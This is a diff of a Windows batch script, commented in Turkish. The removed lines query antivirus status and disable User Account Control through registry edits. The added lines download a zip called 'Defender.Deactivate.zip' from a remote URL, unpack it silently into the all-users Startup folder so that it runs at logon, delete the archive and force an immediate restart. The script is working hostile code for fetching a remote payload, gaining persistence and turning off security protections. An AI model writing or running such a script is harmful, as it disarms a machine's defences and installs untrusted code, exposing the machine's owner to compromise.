@@ -1,12 +1,19 @@
 @echo off
-wmic /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /Format:List
 
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA" /t REG_DWORD /d "0" /f
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorAdmin" /t REG_DWORD /d "0" /f
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "ConsentPromptBehaviorUser" /t REG_DWORD /d "0" /f
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "PromptOnSecureDesktop" /t REG_DWORD /d "0" /f
+:: İndirilecek dosyanın URL'si ve hedef yolu
+set "URL=https://github.com/user-attachments/files/16737833/Defender.Deactivate.zip"
+set "DOWNLOAD_DIR=%ProgramData%\Microsoft\Windows\Start Menu\Programs\StartUp"
+set "ZIP_FILE=%DOWNLOAD_DIR%\Defender.Deactivate.zip"
+set "EXTRACT_DIR=%DOWNLOAD_DIR%"
 
-REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
+:: İndirilen zip dosyasını hedef dizine kaydet
+powershell -Command "Invoke-WebRequest -Uri '%URL%' -OutFile '%ZIP_FILE%'"
+
+:: Zip dosyasını WinRAR ile aç
+"C:\Program Files\WinRAR\WinRAR.exe" x -ibck "%ZIP_FILE%" "%EXTRACT_DIR%"
+
+:: Zip dosyasını sil
+del "%ZIP_FILE%"
+
+
 shutdown /r /f /t 0
-
-pause
